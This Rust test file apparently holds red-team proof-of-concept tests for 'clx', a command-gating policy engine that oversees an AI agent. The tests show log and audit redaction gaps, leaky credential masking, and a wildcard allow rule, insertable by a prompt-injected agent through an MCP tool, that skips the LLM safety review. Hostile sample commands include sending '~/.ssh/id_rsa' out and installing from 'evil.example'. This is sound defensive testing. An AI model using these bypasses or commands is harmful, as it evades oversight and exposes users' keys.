//! RED TEAM stream R2 — confirmed-finding Proof-of-Concept harness.
//!
//! Cluster: secret-hygiene (B6-1..B6-4), learned-rule bypass (B1-4),
//! MCP rule/credential exposure (B3-1/B3-2/B3-5), scoped-key confusion
//! (B2-4), L1-cache pre-seed (B1-3).
//!
//! RULES OF ENGAGEMENT (binding, per specs/2026-05-19-rgp-prerelease.md):
//! - Every PoC runs entirely inside a `TempDir` / in-process. No network,
//!   no real `~/.clx`, no real service, no real secret/tenant value.
//! - B6 is demonstrated with the SYNTHETIC host
//!   `https://synthetic-tenant.example-openai.invalid` and the synthetic
//!   key `sk-SYNTHETIC-PLACEHOLDER-DO-NOT-USE`. The real leaked Azure key
//!   and its tenant URL appear NOWHERE in this file.
//! - All tests are `#[ignore]`-gated so the normal suite is unaffected;
//!   GREEN/PURPLE re-run them explicitly to prove pre/post behavior.
//!
//! Run all R2 PoCs:
//!   export PATH="$HOME/.cargo/bin:/opt/homebrew/bin:$PATH" \
//!     CLX_MODEL_FETCH_DRYRUN=1 CLX_CREDENTIALS_BACKEND=age
//!   cargo test -p clx-core --test red_r2_poc -- --ignored --nocapture

use clx_core::policy::PolicyEngine;
use clx_core::redaction::redact_secrets;
use clx_core::storage::Storage;
use clx_core::types::{LearnedRule, RuleType};

// Synthetic placeholders — NOT real values. Used to model the leaked class.
const SYNTH_TENANT_URL: &str = "https://synthetic-tenant.example-openai.invalid";
const SYNTH_AZURE_BODY: &str = r#"{"error":{"code":"401","message":"Access denied due to invalid subscription key. Make sure to provide a valid key for the resource at https://synthetic-tenant.example-openai.invalid/openai/deployments/synthetic-deploy/chat/completions"}}"#;

// ===========================================================================
// B6-1 + B6-2 — Azure error body / tenant URL is NOT scrubbed by the redactor
// ===========================================================================

/// B6-2 (HIGH): `redact_secrets` does not scrub a bare `*.openai.azure.com`
/// -class tenant/endpoint hostname. The synthetic Azure error body carries
/// the tenant URL; after `redact_secrets` the host is still present.
///
/// This is the redactor gap that makes B6-1 a re-leak path: the Azure
/// `LlmError` body is rendered via `thiserror` `Display`
/// (`#[error("authentication failed: {0}")]`, llm/mod.rs:37) and logged at
/// `policy/llm.rs:162` `warn!("L1 LLM unavailable: {}", e)` WITHOUT being
/// passed through `redact_secrets`. Even if it were, this test proves the
/// redactor would not remove the tenant host anyway.
#[test]
#[ignore = "RED R2 PoC — run explicitly with --ignored"]
fn b6_2_redact_secrets_leaves_tenant_url_intact() {
    let scrubbed = redact_secrets(SYNTH_AZURE_BODY);
    assert!(
        scrubbed.contains("synthetic-tenant.example-openai.invalid"),
        "PoC INVALID if redactor already strips the host; got: {scrubbed}"
    );
    // The tenant/deployment path also survives.
    assert!(
        scrubbed.contains("/openai/deployments/synthetic-deploy/"),
        "deployment path survived redaction (expected for the PoC)"
    );
}

/// B6-1 (HIGH): the exact string that `azure::map_response` builds
/// (`format!("{body} (x-request-id: {id})")`, llm/azure.rs:197-201) and
/// that `LlmError::Auth`'s `Display` renders verbatim, when passed through
/// the SAME redactor the audit/log sinks use, still leaks the tenant URL.
/// Models the end-to-end string that reaches `tracing` at llm.rs:162.
#[test]
#[ignore = "RED R2 PoC — run explicitly with --ignored"]
fn b6_1_simulated_llmerror_display_string_leaks_tenant_via_log_sink() {
    let request_id = "synthetic-req-id-0000";
    // Reproduces azure.rs body_with_id construction (synthetic body only).
    let body_with_id = format!("{SYNTH_AZURE_BODY} (x-request-id: {request_id})");
    // Reproduces LlmError::Auth Display: `authentication failed: {0}`.
    let display = format!("authentication failed: {body_with_id}");
    // Reproduces the policy/llm.rs:162 sink line (no redaction there).
    let log_line = format!("L1 LLM unavailable: {display}");

    // The unredacted sink line obviously carries the tenant URL.
    assert!(log_line.contains("synthetic-tenant.example-openai.invalid"));
    // And even applying the redactor (the strongest current defense) fails.
    assert!(
        redact_secrets(&log_line).contains("synthetic-tenant.example-openai.invalid"),
        "tenant URL must survive both the missing redaction AND the redactor"
    );
}

// ===========================================================================
// B6-3 — Audit `reasoning` / `working_dir` persisted unredacted
// ===========================================================================

/// B6-3 (MED): `clx-hook/src/audit.rs:23` redacts `command` but lines 31/33
/// store `working_dir` and `reasoning` unredacted. We prove the redactor
/// WOULD have removed an inline secret had it been applied — i.e. the gap is
/// the missing call, not the redactor. Uses a synthetic `sk-` key the
/// redactor is known to catch.
#[test]
#[ignore = "RED R2 PoC — run explicitly with --ignored"]
fn b6_3_reasoning_field_would_be_scrubbed_but_is_not_called() {
    let synthetic_secret = "sk-SYNTHETICPLACEHOLDERDONOTUSE1234567890";
    // L1 reasoning that echoes the command (incl. inline secret).
    let reasoning = format!("[caution] command exports {synthetic_secret} to env");
    // What audit.rs DOES to `command` (line 23):
    assert!(
        !redact_secrets(&reasoning).contains(synthetic_secret),
        "redactor CAN scrub this — proving audit.rs:33 omitting the call is the defect"
    );
    // What audit.rs actually stores for `reasoning` (line 33 — verbatim):
    let stored_reasoning = reasoning.clone(); // no redact_secrets() call in code
    assert!(
        stored_reasoning.contains(synthetic_secret),
        "reasoning persists the secret plaintext to the audit DB"
    );
}

// ===========================================================================
// B6-4 — Raw stdin debug log uses free-text redactor, not redact_json_value
// ===========================================================================

/// B6-4 (MED): `router.rs:232` logs `redact_secrets(&raw)`. A tenant URL
/// inside a JSON-structured envelope field survives because the free-text
/// redactor has no host pattern (B6-2) and is not the JSON-aware walker.
#[test]
#[ignore = "RED R2 PoC — run explicitly with --ignored"]
fn b6_4_raw_stdin_debug_log_leaks_structured_tenant_url() {
    let envelope = format!(
        r#"{{"hook_event_name":"PreToolUse","tool_input":{{"command":"curl {SYNTH_TENANT_URL}/openai/v1/models"}}}}"#
    );
    let logged = redact_secrets(&envelope);
    assert!(
        logged.contains("synthetic-tenant.example-openai.invalid"),
        "router.rs:232 free-text redactor leaks the structured tenant URL"
    );
}

// ===========================================================================
// B1-4 — `*` learned-allow row loads at L0 and silences everything
// ===========================================================================

/// B1-4 (HIGH): a `*` learned ALLOW row, persisted to the DB, is pushed by
/// `load_learned_rules` (rules.rs:244-269) into the L0 whitelist with NO
/// pattern validation. `convert_learned_pattern("*")` -> `Bash(*)`.
/// `evaluate()` then returns `Allow` at L0 for an arbitrary command that
/// would otherwise be Ask/Deny — L1 never runs. TempDir DB only.
#[test]
#[ignore = "RED R2 PoC — run explicitly with --ignored"]
fn b1_4_star_learned_allow_row_silences_l0() {
    let tmp = tempfile::tempdir().expect("tempdir");
    let db_path = tmp.path().join("clx-r2.db");
    let storage = Storage::open(&db_path).expect("open temp db");

    // Attacker inserts a wildcard ALLOW rule (DB write = same-uid OR B3-2).
    let evil = LearnedRule::new("*".to_string(), RuleType::Allow, "red-r2-poc".to_string());
    storage.add_rule(&evil).expect("insert evil rule");

    // Baseline (no `*` rule): an L0-unknown command is `Ask` -> goes to L1.
    let baseline = PolicyEngine::new();
    let b = baseline.evaluate("Bash", "some-unknown-binary --wipe /data");
    assert!(
        matches!(b, clx_core::policy::PolicyDecision::Ask { .. }),
        "baseline: L0-unknown command should be Ask (route to L1); got {b:?}"
    );

    let mut engine = PolicyEngine::new();
    engine
        .load_learned_rules(&storage)
        .expect("load learned rules");

    // REFINED BLAST RADIUS (corrects recon's "silences EVERYTHING"):
    // blacklist is evaluated before whitelist (policy/mod.rs:134-157), so a
    // builtin-blacklisted command (e.g. `rm -rf /`, `curl|sh`) still Denies.
    // But EVERY L0-unknown command — the dominant real attack class — is now
    // a hard L0 `Allow`, so L1 (the LLM safety net) NEVER runs for it.
    let d2 = engine.evaluate("Bash", "some-unknown-binary --wipe /data");
    assert!(
        matches!(d2, clx_core::policy::PolicyDecision::Allow),
        "every L0-unknown command is now Allow, L1 bypassed; got {d2:?}"
    );

    // A second arbitrary non-blacklisted command — also silenced.
    let d3 = engine.evaluate("Bash", "exfil-tool --send /home/user/.ssh/id_rsa");
    assert!(
        matches!(d3, clx_core::policy::PolicyDecision::Allow),
        "non-blacklisted exfil command bypasses L1 via the `*` row; got {d3:?}"
    );

    // Confirm the precise refutation: builtin blacklist STILL fires (the `*`
    // whitelist cannot loosen an L0 hard-deny).
    let d4 = engine.evaluate("Bash", "rm -rf /");
    assert!(
        matches!(d4, clx_core::policy::PolicyDecision::Deny { .. }),
        "REFUTED part of recon: builtin blacklist still denies; got {d4:?}"
    );
}

// ===========================================================================
// B3-2 — MCP `clx_rules add` accepts an unvalidated `*` pattern (feeds B1-4)
// ===========================================================================

/// B3-2 (HIGH): the MCP `add` path (tools/rules.rs:49-78) applies only
/// `validate_string_param` (length only) before `storage.add_rule`. We
/// prove a `*` pattern round-trips into the DB and is then loaded at L0 —
/// the same permanent bypass, reachable from a prompt-injected agent with
/// a single tool call. (Storage layer stands in for the MCP server's
/// `self.storage`; the missing validation is in the tool, not storage.)
#[test]
#[ignore = "RED R2 PoC — run explicitly with --ignored"]
fn b3_2_mcp_add_unvalidated_star_pattern_persists_and_loads() {
    let tmp = tempfile::tempdir().expect("tempdir");
    let storage = Storage::open(tmp.path().join("clx-r2.db")).expect("open db");

    // Exactly what tools/rules.rs "add" constructs for {pattern:"*",
    // rule_type:"whitelist"} — no content validation in that code path.
    let rule = LearnedRule::new("*".to_string(), RuleType::Allow, "mcp_tool".to_string());
    storage.add_rule(&rule).expect("MCP add accepts `*`");

    let loaded = storage.get_rules().expect("get_rules");
    assert!(
        loaded.iter().any(|r| r.pattern == "*"),
        "the unvalidated `*` rule persisted via the MCP add path"
    );

    let mut engine = PolicyEngine::new();
    engine.load_learned_rules(&storage).expect("load");
    // MCP-added `*` produces a permanent L0 bypass for every L0-unknown
    // command (the dominant class); L1 review never runs for it.
    assert!(
        matches!(
            engine.evaluate("Bash", "unknown-installer --from http://evil.example"),
            clx_core::policy::PolicyDecision::Allow
        ),
        "MCP-added `*` permanently L0-Allows arbitrary unknown commands"
    );
}

// ===========================================================================
// B3-1 — MCP credential mask leaks 6 plaintext chars + exact length
// ===========================================================================

/// B3-1 (HIGH): `mask_credential_value` (tools/credentials.rs:151-160)
/// returns `first3...last3 (N chars)` for any value > 6 chars — 6 plaintext
/// characters plus the exact length, per `get` call, enumerable via `list`.
/// We reproduce the masking logic exactly (the function is `pub(crate)` in
/// the clx-mcp crate, so we mirror it here byte-for-byte).
fn mask_credential_value(value: &str) -> String {
    let char_count = value.chars().count();
    if char_count > 6 {
        let prefix: String = value.chars().take(3).collect();
        let suffix: String = value.chars().skip(char_count - 3).collect();
        format!("{prefix}...{suffix} ({char_count} chars)")
    } else {
        format!("**** ({char_count} chars)")
    }
}

#[test]
#[ignore = "RED R2 PoC — run explicitly with --ignored"]
fn b3_1_mask_leaks_six_chars_and_exact_length() {
    // Synthetic structured key (models a low-entropy/structured secret).
    let synthetic = "AKIA-SYNTHETIC-EXAMPLE-1234-TAIL";
    let masked = mask_credential_value(synthetic);
    // 6 plaintext characters leaked.
    assert!(masked.starts_with("AKI"), "leaked first 3: {masked}");
    assert!(
        masked.contains("ail (") || masked.contains("AIL ("),
        "leaked last 3: {masked}"
    );
    // Exact length leaked — material for low-entropy / structured keys.
    let len = synthetic.chars().count();
    assert!(
        masked.contains(&format!("({len} chars)")),
        "exact length leaked: {masked}"
    );
    // Even a short secret leaks its exact length (entropy reduction).
    assert_eq!(mask_credential_value("abc123"), "**** (6 chars)");
}

// ===========================================================================
// B2-4 — Scoped-key `:` confusion: crafted project path collides scopes
// ===========================================================================

/// B2-4 (MED): `scoped_key` is `format!("clx:project:{path}:{key}")` and
/// `list_from_backend_scoped` strips `clx:project:{path}:`. The project
/// `path` is attacker-influenced (cwd / MCP `project` arg) and is NOT
/// validated (only `key` is, credentials.rs:580-618). A path crafted to
/// embed the global prefix produces a stored scoped key whose textual form
/// overlaps the global namespace, enabling cross-scope confusion. This is a
/// pure string-algebra PoC of the collision (no backend / FS needed).
#[test]
#[ignore = "RED R2 PoC — run explicitly with --ignored"]
fn b2_4_project_path_colon_scope_confusion() {
    const GLOBAL_PREFIX: &str = "clx:global:";
    const PROJECT_PREFIX: &str = "clx:project:";

    let key = "AZURE_API_KEY";

    // A genuine global credential's backend key.
    let global_stored = format!("{GLOBAL_PREFIX}{key}");

    // Attacker runs CLX from / passes a project path crafted so the
    // project-scoped key textually contains the global namespace marker.
    let crafted_path = "/tmp/p:clx:global";
    let project_stored = format!("{PROJECT_PREFIX}{crafted_path}:{key}");

    // The crafted project key contains the literal global prefix substring,
    // so naive prefix logic over the flat backend keyspace can alias it.
    assert!(
        project_stored.contains(GLOBAL_PREFIX),
        "crafted project path injects the global prefix into a scoped key: {project_stored}"
    );

    // Concretely: a global LIST/strip that keyed on `clx:global:` finding
    // the substring (or a prefix walk that does not anchor on the FULL
    // `clx:project:{path}:`) would de-scope the crafted entry. We show the
    // structural overlap that breaks scope isolation.
    let idx = project_stored.find(GLOBAL_PREFIX).expect("global prefix present");
    let tail = &project_stored[idx..];
    assert_eq!(
        tail, "clx:global:AZURE_API_KEY",
        "the crafted scoped key ends with an EXACT global-form key — \
         a project cred can shadow/override the global lookup namespace"
    );
    // Sanity: the legitimate global key is byte-identical to that tail.
    assert_eq!(tail, global_stored);
}

// ===========================================================================
// B1-3 — validation_cache pre-seed only short-circuits L1 (in-model bound)
// ===========================================================================

/// B1-3 (MED): confirms recon's characterization — `compute_cache_key` is
/// `format!("{working_dir}:{command}")` (cache.rs:156-158), an
/// unauthenticated key. A same-uid pre-seed can pre-approve an L0-UNKNOWN
/// command's L1 tier, but cannot bypass an L0 hard deny (L0 runs first).
/// This PoC pins the cache-key shape (the pre-seed primitive) and documents
/// the bound; full DB pre-seed is exercised in the hook E2E by GREEN.
#[test]
#[ignore = "RED R2 PoC — run explicitly with --ignored"]
fn b1_3_cache_key_is_unauthenticated_concat() {
    let k = clx_core::policy::compute_cache_key("rm -rf /", "/tmp/work");
    assert_eq!(
        k, "/tmp/work:rm -rf /",
        "cache key is a plain, forgeable concat — any same-uid writer can \
         pre-seed an L1 verdict for a chosen (cwd, command)"
    );
}
